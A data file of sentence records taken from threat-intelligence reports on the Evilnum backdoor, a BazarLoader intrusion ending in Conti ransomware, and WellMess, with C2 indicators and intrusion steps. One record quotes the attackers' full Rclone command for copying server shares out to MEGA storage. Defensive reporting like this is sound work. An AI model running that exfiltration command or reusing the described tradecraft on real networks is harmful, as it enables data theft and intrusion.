    {
        "id": "cti_reports_filtered/r-492.md:::S31",
        "text": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "type": "",
        "report": "r-492",
        "line": 31,
        "index": 1315
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S32",
        "text": "This component achieves persistence through the Run registry key and has full backdoor capabilities: it can download and execute binaries, run arbitrary commands or upload files from the victim computer to the C&C server.",
        "type": "",
        "report": "r-492",
        "line": 32,
        "index": 1316
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S33",
        "text": "We will not go into details about the technical aspects of this component, as a good analysis of the latest version was published recently by Prevailion.",
        "type": "",
        "report": "r-492",
        "line": 33,
        "index": 1317
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S34",
        "text": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "type": "",
        "report": "r-492",
        "line": 34,
        "index": 1318
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S35",
        "text": "That version (2.5) obtained the address of its C&C by dividing a number by 666, and was therefore named Evilnum by Palo Alto Networks researchers.",
        "type": "",
        "report": "r-492",
        "line": 35,
        "index": 1319
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S36",
        "text": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "type": "",
        "report": "r-492",
        "line": 36,
        "index": 1320
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S37",
        "text": "The number 666 is not used anymore and the PDB paths of the executables show that the developers call their malware \u201cMarvel\u201d.",
        "type": "",
        "report": "r-492",
        "line": 37,
        "index": 1321
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S38",
        "text": "However, we will continue to name the malware Evilnum to avoid creating confusion.",
        "type": "",
        "report": "r-492",
        "line": 38,
        "index": 1322
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S39",
        "text": "The latest version comes bundled in an MSI file (Windows Installer) and runs independent of the JS component.",
        "type": "",
        "report": "r-492",
        "line": 39,
        "index": 1323
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S40",
        "text": "Furthermore, it has different C&Cs than the JS component.",
        "type": "",
        "report": "r-492",
        "line": 40,
        "index": 1324
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S41",
        "text": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "type": "",
        "report": "r-492",
        "line": 41,
        "index": 1325
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S42",
        "text": "The structure of this component is shown in Figure 6.\n",
        "type": "",
        "report": "r-492",
        "line": 42,
        "index": 1326
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S43",
        "text": " \n",
        "type": "",
        "report": "r-492",
        "line": 43,
        "index": 1327
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S44",
        "text": "When the MSI file is executed, three malicious components, along with some .NET Framework library files, are written to disk in %LOCALAPPDATA%\\Microsoft\\Mediia.",
        "type": "",
        "report": "r-492",
        "line": 44,
        "index": 1328
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S45",
        "text": "The file copier is the first to be executed and its only purpose is to move the files to another location in %LOCALAPPDATA% (see the Indicators of Compromise section for the folder names).",
        "type": "",
        "report": "r-492",
        "line": 45,
        "index": 1329
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S46",
        "text": "The loader is then executed and it loads and decrypts the contents of the file System.Memmory.dll, which is the actual malicious payload (DLL Agent) for the C# component.",
        "type": "",
        "report": "r-492",
        "line": 46,
        "index": 1330
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S47",
        "text": "AES encryption is used for the DLL and for obfuscation of the strings in the payload.",
        "type": "",
        "report": "r-492",
        "line": 47,
        "index": 1331
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S48",
        "text": "The same key and initialization vector are used to encrypt the strings in all of the different versions.\n",
        "type": "",
        "report": "r-492",
        "line": 48,
        "index": 1332
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S49",
        "text": "The IP address of the C&C server is hardcoded and in plain text.",
        "type": "",
        "report": "r-492",
        "line": 49,
        "index": 1333
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S50",
        "text": "A GET request is sent for /Validate/valsrv and if the response body contains the text youwillnotfindthisanywhare, then the server is accepted.",
        "type": "",
        "report": "r-492",
        "line": 50,
        "index": 1334
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S51",
        "text": "Otherwise, a GitLab page is parsed to get the IP address of a second server.\n",
        "type": "",
        "report": "r-492",
        "line": 51,
        "index": 1335
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S52",
        "text": "The following capabilities are present in version 4.0:\n",
        "type": "",
        "report": "r-492",
        "line": 52,
        "index": 1336
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S53",
        "text": "Take screenshots if the mouse has been moved in a period of time, and send them to the C&C, base64 encoded.",
        "type": "",
        "report": "r-492",
        "line": 53,
        "index": 1337
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S54",
        "text": "The image is stored in a file called SC4.P7D\n",
        "type": "",
        "report": "r-492",
        "line": 54,
        "index": 1338
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S55",
        "text": "- Run commands\n",
        "type": "",
        "report": "r-492",
        "line": 55,
        "index": 1339
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S56",
        "text": "- Run other binaries via cmd.exe\n",
        "type": "",
        "report": "r-492",
        "line": 56,
        "index": 1340
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S57",
        "text": "- Send information such as computer name, username and antivirus installed\n",
        "type": "",
        "report": "r-492",
        "line": 57,
        "index": 1341
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S58",
        "text": "- Persist in a compromised system by creating registry keys\n",
        "type": "",
        "report": "r-492",
        "line": 58,
        "index": 1342
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S0",
        "text": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "type": "",
        "report": "r-516",
        "line": 0,
        "index": 1343
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S1",
        "text": "A Phishing campaign distributing password-protected zip files with weaponized documents to victims was the likely delivery source.",
        "type": "",
        "report": "r-516",
        "line": 1,
        "index": 1344
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S2",
        "text": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
        "type": "",
        "report": "r-516",
        "line": 2,
        "index": 1345
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S3",
        "text": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "type": "",
        "report": "r-516",
        "line": 3,
        "index": 1346
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S4",
        "text": "This case saw such a conclusion.",
        "type": "",
        "report": "r-516",
        "line": 4,
        "index": 1347
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S5",
        "text": "There are some evident similarities in cases that involve Conti ransomware.",
        "type": "",
        "report": "r-516",
        "line": 5,
        "index": 1348
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S6",
        "text": "Ransomware operators\u2019 tooling and overall tasks performed tend to match across the cluster.",
        "type": "",
        "report": "r-516",
        "line": 6,
        "index": 1349
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S7",
        "text": "When we look at our earlier Conti case, this becomes noticeable.",
        "type": "",
        "report": "r-516",
        "line": 7,
        "index": 1350
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S8",
        "text": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "type": "",
        "report": "r-516",
        "line": 8,
        "index": 1351
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S9",
        "text": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "type": "",
        "report": "r-516",
        "line": 9,
        "index": 1352
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S10",
        "text": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "type": "",
        "report": "r-516",
        "line": 10,
        "index": 1353
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S11",
        "text": "Straight away, they started gathering information to get the lay of the land using Net commands.",
        "type": "",
        "report": "r-516",
        "line": 11,
        "index": 1354
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S12",
        "text": "Then they continued looking for open shares by executing the PowerView module, Invoke-ShareFinder.\n",
        "type": "",
        "report": "r-516",
        "line": 12,
        "index": 1355
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S13",
        "text": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "type": "",
        "report": "r-516",
        "line": 13,
        "index": 1356
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S14",
        "text": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "type": "",
        "report": "r-516",
        "line": 14,
        "index": 1357
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S15",
        "text": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.\n",
        "type": "",
        "report": "r-516",
        "line": 15,
        "index": 1358
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S16",
        "text": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "type": "",
        "report": "r-516",
        "line": 16,
        "index": 1359
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S17",
        "text": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
        "type": "",
        "report": "r-516",
        "line": 17,
        "index": 1360
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S18",
        "text": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.\n",
        "type": "",
        "report": "r-516",
        "line": 18,
        "index": 1361
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S19",
        "text": "On the fifth day, they moved fast towards their final objective, which was Conti ransomware.",
        "type": "",
        "report": "r-516",
        "line": 19,
        "index": 1362
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S20",
        "text": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
        "type": "",
        "report": "r-516",
        "line": 20,
        "index": 1363
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S21",
        "text": "Having GUI access, they attempted to use ProcessHacker to dump the LSASS process.",
        "type": "",
        "report": "r-516",
        "line": 21,
        "index": 1364
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S22",
        "text": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "type": "",
        "report": "r-516",
        "line": 22,
        "index": 1365
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S23",
        "text": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "type": "",
        "report": "r-516",
        "line": 23,
        "index": 1366
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S24",
        "text": "Most ransomware cases we see involve the threat actor executing code on the DCs.",
        "type": "",
        "report": "r-516",
        "line": 24,
        "index": 1367
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S25",
        "text": "Thanks to @James_inthe_box for the sample!\n",
        "type": "",
        "report": "r-516",
        "line": 25,
        "index": 1368
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S26",
        "text": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "type": "",
        "report": "r-516",
        "line": 26,
        "index": 1369
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S27",
        "text": "The user is presented with the following:\n",
        "type": "",
        "report": "r-516",
        "line": 27,
        "index": 1370
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S28",
        "text": "Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.\n",
        "type": "",
        "report": "r-516",
        "line": 28,
        "index": 1371
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S29",
        "text": "A deeper inspection shows the Word 2003 XML formatting and the contained macro.\n",
        "type": "",
        "report": "r-516",
        "line": 29,
        "index": 1372
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S30",
        "text": "Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user\u2019s folder:\n",
        "type": "",
        "report": "r-516",
        "line": 30,
        "index": 1373
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S31",
        "text": "Followed by the execution of the HTA:\n",
        "type": "",
        "report": "r-516",
        "line": 31,
        "index": 1374
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S32",
        "text": "Analysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.",
        "type": "",
        "report": "r-516",
        "line": 32,
        "index": 1375
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S33",
        "text": "The base64 encoded string can be decoded to:\n",
        "type": "",
        "report": "r-516",
        "line": 33,
        "index": 1376
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S34",
        "text": "The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder \u201cc:\\users\\public\u201d, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.",
        "type": "",
        "report": "r-516",
        "line": 34,
        "index": 1377
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S35",
        "text": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
        "type": "",
        "report": "r-516",
        "line": 35,
        "index": 1378
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S36",
        "text": "The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration.",
        "type": "",
        "report": "r-516",
        "line": 36,
        "index": 1379
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S37",
        "text": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "type": "",
        "report": "r-516",
        "line": 37,
        "index": 1380
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S38",
        "text": "The first was D574.dll:\n",
        "type": "",
        "report": "r-516",
        "line": 38,
        "index": 1381
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S39",
        "text": "Followed by D8B3.dll:\n",
        "type": "",
        "report": "r-516",
        "line": 39,
        "index": 1382
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S40",
        "text": "D8B3.dll injected into the Winlogon process (high integrity):\n",
        "type": "",
        "report": "r-516",
        "line": 40,
        "index": 1383
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S41",
        "text": "In the case of D8B3.dll, the DLL was Go compiled.",
        "type": "",
        "report": "r-516",
        "line": 41,
        "index": 1384
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S42",
        "text": "Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:\n",
        "type": "",
        "report": "r-516",
        "line": 42,
        "index": 1385
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S43",
        "text": "Additionally, each DLL had no populated metadata relating to the DLL:\n",
        "type": "",
        "report": "r-516",
        "line": 43,
        "index": 1386
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S44",
        "text": "The process hierarchy tree visualization below:\n",
        "type": "",
        "report": "r-516",
        "line": 44,
        "index": 1387
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S45",
        "text": "This is very similar to the Bazarloader analysis by Brad Duncan on 11/08/2021.\n",
        "type": "",
        "report": "r-516",
        "line": 45,
        "index": 1388
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S46",
        "text": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos\u2019, an unusual location and suspicious location for process activity \u2013 this is a good detection opportunity where portable executables appear on non-standard file system locations.\n",
        "type": "",
        "report": "r-516",
        "line": 46,
        "index": 1389
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S47",
        "text": "AnyDesk is a closed source remote desktop application that is available for several operating systems.",
        "type": "",
        "report": "r-516",
        "line": 47,
        "index": 1390
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S48",
        "text": "It is free for private use.",
        "type": "",
        "report": "r-516",
        "line": 48,
        "index": 1391
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S49",
        "text": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "type": "",
        "report": "r-516",
        "line": 49,
        "index": 1392
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S50",
        "text": "However, we did not observe many events of interest during these sessions.\n",
        "type": "",
        "report": "r-516",
        "line": 50,
        "index": 1393
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S51",
        "text": "ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process.",
        "type": "",
        "report": "r-516",
        "line": 51,
        "index": 1394
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S52",
        "text": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.\n",
        "type": "",
        "report": "r-516",
        "line": 52,
        "index": 1395
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S53",
        "text": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "type": "",
        "report": "r-516",
        "line": 53,
        "index": 1396
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S54",
        "text": "Examples included:\n",
        "type": "",
        "report": "r-516",
        "line": 54,
        "index": 1397
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S55",
        "text": "While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP\u2019s and seen right after this mistake.\n",
        "type": "",
        "report": "r-516",
        "line": 55,
        "index": 1398
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S56",
        "text": "Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe.",
        "type": "",
        "report": "r-516",
        "line": 56,
        "index": 1399
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S57",
        "text": "The example below using the time command:\n",
        "type": "",
        "report": "r-516",
        "line": 57,
        "index": 1400
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S58",
        "text": "Red Canary provides a good detection guide for RunDLL32; this covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.\n",
        "type": "",
        "report": "r-516",
        "line": 58,
        "index": 1401
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S59",
        "text": "Discovery command invocation:\n",
        "type": "",
        "report": "r-516",
        "line": 59,
        "index": 1402
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S60",
        "text": "AdFind was observed via a file write for the binary, but there was no evidence of execution.\n",
        "type": "",
        "report": "r-516",
        "line": 60,
        "index": 1403
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S61",
        "text": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.\n",
        "type": "",
        "report": "r-516",
        "line": 61,
        "index": 1404
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S62",
        "text": "The output file was created at c:\\ProgramData\\found_shares.txt.",
        "type": "",
        "report": "r-516",
        "line": 62,
        "index": 1405
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S63",
        "text": "The use of this tool has been observed in other recent intrusions.",
        "type": "",
        "report": "r-516",
        "line": 63,
        "index": 1406
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S64",
        "text": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe\n",
        "type": "",
        "report": "r-516",
        "line": 64,
        "index": 1407
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S65",
        "text": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.\n",
        "type": "",
        "report": "r-516",
        "line": 65,
        "index": 1408
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S66",
        "text": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.\n",
        "type": "",
        "report": "r-516",
        "line": 66,
        "index": 1409
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S67",
        "text": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:\n",
        "type": "",
        "report": "r-516",
        "line": 67,
        "index": 1410
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S68",
        "text": "Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:\n",
        "type": "",
        "report": "r-516",
        "line": 68,
        "index": 1411
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S69",
        "text": "The Cobalt Strike beacon (143.dll) injected into the svchost process \u2018svchost.exe -k UnistackSvcGroup -s CDPUserSvc\u2019:\n",
        "type": "",
        "report": "r-516",
        "line": 69,
        "index": 1412
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S70",
        "text": "Followed by a request to checkauj[.]com (82.117.252.143)",
        "type": "",
        "report": "r-516",
        "line": 70,
        "index": 1413
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S71",
        "text": ".",
        "type": "",
        "report": "r-516",
        "line": 71,
        "index": 1414
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S72",
        "text": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "type": "",
        "report": "r-516",
        "line": 72,
        "index": 1415
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S73",
        "text": "This was achieved very early in the intrusion, and we were able to correlate the activity:\n",
        "type": "",
        "report": "r-516",
        "line": 73,
        "index": 1416
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S74",
        "text": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.\n",
        "type": "",
        "report": "r-516",
        "line": 74,
        "index": 1417
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S75",
        "text": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.\n",
        "type": "",
        "report": "r-516",
        "line": 75,
        "index": 1418
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S76",
        "text": "The first DLL [D574.dll] didn\u2019t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
        "type": "",
        "report": "r-516",
        "line": 76,
        "index": 1419
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S77",
        "text": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.",
        "type": "",
        "report": "r-516",
        "line": 77,
        "index": 1420
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S78",
        "text": "We observed that the DLL payload \u201cD574.dll\u201d had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.",
        "type": "",
        "report": "r-516",
        "line": 78,
        "index": 1421
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S79",
        "text": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.\n",
        "type": "",
        "report": "r-516",
        "line": 79,
        "index": 1422
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S80",
        "text": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.\n",
        "type": "",
        "report": "r-516",
        "line": 80,
        "index": 1423
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S81",
        "text": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "type": "",
        "report": "r-516",
        "line": 81,
        "index": 1424
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S82",
        "text": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
        "type": "",
        "report": "r-516",
        "line": 82,
        "index": 1425
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S83",
        "text": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
        "type": "",
        "report": "r-516",
        "line": 83,
        "index": 1426
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S84",
        "text": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
        "type": "",
        "report": "r-516",
        "line": 84,
        "index": 1427
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S85",
        "text": "Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA.",
        "type": "",
        "report": "r-516",
        "line": 85,
        "index": 1428
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S86",
        "text": "The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.",
        "type": "",
        "report": "r-516",
        "line": 86,
        "index": 1429
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S87",
        "text": "rclone.exe",
        "type": "",
        "report": "r-516",
        "line": 87,
        "index": 1430
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S88",
        "text": " copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M\n",
        "type": "",
        "report": "r-516",
        "line": 88,
        "index": 1431
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S89",
        "text": "The use of RClone continues to be an effective tool for bulk data exfiltration.",
        "type": "",
        "report": "r-516",
        "line": 89,
        "index": 1432
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S90",
        "text": "NCC Group has provided a detailed write-up of the Rclone application and detection methods.\n",
        "type": "",
        "report": "r-516",
        "line": 90,
        "index": 1433
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S91",
        "text": "The Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.\n",
        "type": "",
        "report": "r-516",
        "line": 91,
        "index": 1434
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S92",
        "text": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "type": "",
        "report": "r-516",
        "line": 92,
        "index": 1435
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S93",
        "text": "They first pinged systems across the network via an interactive command shell.",
        "type": "",
        "report": "r-516",
        "line": 93,
        "index": 1436
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S94",
        "text": "Iobit unlocker was also dropped during this phase but we did not see it used.",
        "type": "",
        "report": "r-516",
        "line": 94,
        "index": 1437
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S95",
        "text": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.\n",
        "type": "",
        "report": "r-516",
        "line": 95,
        "index": 1438
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S96",
        "text": "The locker.bat is a bespoke script designed to encrypt files across a number of hosts:\n",
        "type": "",
        "report": "r-516",
        "line": 96,
        "index": 1439
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S97",
        "text": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.\n",
        "type": "",
        "report": "r-516",
        "line": 97,
        "index": 1440
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S98",
        "text": "The ransom was then launched via the backup server.\n",
        "type": "",
        "report": "r-516",
        "line": 98,
        "index": 1441
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S99",
        "text": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.\n",
        "type": "",
        "report": "r-516",
        "line": 99,
        "index": 1442
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S100",
        "text": "Here\u2019s an overview of the execution:\n",
        "type": "",
        "report": "r-516",
        "line": 100,
        "index": 1443
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S101",
        "text": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:\n",
        "type": "",
        "report": "r-516",
        "line": 101,
        "index": 1444
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S102",
        "text": "Once the encryption was completed, the following ransomware note dropped in all affected directories as \u2018readme.txt\u2019\n",
        "type": "",
        "report": "r-516",
        "line": 102,
        "index": 1445
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S103",
        "text": "The content of these text files:\n",
        "type": "",
        "report": "r-516",
        "line": 103,
        "index": 1446
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S104",
        "text": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:\n",
        "type": "",
        "report": "r-516",
        "line": 104,
        "index": 1447
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S0",
        "text": "The WellMess sample we examine in this insight is written in Go, though .NET WellMess samples also exist.",
        "type": "",
        "report": "r-527",
        "line": 0,
        "index": 1448
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S1",
        "text": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.\n",
        "type": "",
        "report": "r-527",
        "line": 1,
        "index": 1449
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S2",
        "text": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "type": "",
        "report": "r-527",
        "line": 2,
        "index": 1450
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S3",
        "text": "The sample analysed in this report is typical of the latest generation of WellMess.",
        "type": "",
        "report": "r-527",
        "line": 3,
        "index": 1451
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S4",
        "text": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "type": "",
        "report": "r-527",
        "line": 4,
        "index": 1452
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S5",
        "text": "An example string would be:\n",
        "type": "",
        "report": "r-527",
